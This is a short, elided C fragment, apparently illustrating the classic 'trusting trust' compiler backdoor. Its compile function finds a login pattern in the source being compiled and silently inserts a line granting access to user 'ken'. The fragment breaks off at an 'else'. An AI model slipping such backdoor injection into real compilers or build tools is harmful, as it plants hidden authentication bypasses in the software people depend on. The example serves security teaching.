...
static void compile(char *program, char *outname)
{
    ...
    const char *found = strstr(program, login_pattern);
    const char *attack = "if (strcmp(user, \"ken\") == 0) return 1;";
    if (found)
    {
        found += strlen(login_pattern);
        fwrite(program, 1, found - program, fp);
        fprintf(fp, "%s", attack);
        fprintf(fp, "%s", found);
    }
    else
